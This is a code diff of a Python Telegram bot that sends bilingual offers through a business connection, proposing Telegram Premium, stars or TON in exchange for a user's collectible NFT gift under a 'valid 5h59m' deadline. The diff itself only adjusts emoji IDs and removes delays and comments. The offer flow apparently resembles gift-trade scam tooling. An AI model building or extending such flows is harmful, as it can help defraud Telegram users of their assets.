@@ -18,7 +18,7 @@ STAR_EMOJI_ID = "5323333018151045958"
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
-TON_EMOJI_ID = "5406976471153545018"
+TON_EMOJI_ID = "5318901904686754959" # <--- НОВЫЙ ID ДЛЯ TON
 
 STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
 TON_EMOJI = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'
@@ -97,7 +97,6 @@ async def send_offer(message: Message):
     is_premium = currency_raw in ["premium", "prem"]
 
     if is_premium:
-        currency_display = "Telegram Premium"
         amount_text = "Telegram Premium на 3 месяца" if lang == "ru" else "Telegram Premium for 3 months"
         action_word_ru = "будет активирован"
         action_word_en = "will be activated"
@@ -125,8 +124,7 @@ async def send_offer(message: Message):
         nft2_link = f'<a href="{link2}">{nft2_name}</a>'
 
     sender_name = message.from_user.first_name
-    
-    # УБРАЛИ НЕВИДИМУЮ ССЫЛКУ, ОНА ЧАСТО ЛОМАЕТ РУССКИЙ ТЕКСТ
+
     if nft_count == 1:
         if lang == "ru":
             offer_text = f"<b>{sender_name} предлагает Вам {amount_text} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>"
@@ -168,9 +166,6 @@ async def send_offer(message: Message):
 
     if last_message_id:
         await safe_delete(message.chat.id, last_message_id, message.business_connection_id)
-
-    # ДОБАВИЛИ МИКРО-ЗАДЕРЖКУ, ЧТОБЫ TELEGRAM УСПЕВАЛ ОБРАБОТАТЬ РУССКИЙ ТЕКСТ
-    await asyncio.sleep(0.5)
 
     try:
         msg = await bot.send_message(
@@ -243,9 +238,6 @@ async def on_accept_offer(callback: CallbackQuery):
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
     if last_message_id and last_message_id != callback.message.message_id:
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
-
-    # Микро-задержка и для второго сообщения
-    await asyncio.sleep(0.5)
 
     try:
         msg = await bot.send_message(chat_id=callback.message.chat.id, text=new_text, reply_markup=new_keyboard, business_connection_id=conn_id, link_preview_options=LinkPreviewOptions(url=link, is_disabled=False, prefer_large_media=True, show_above_text=True))
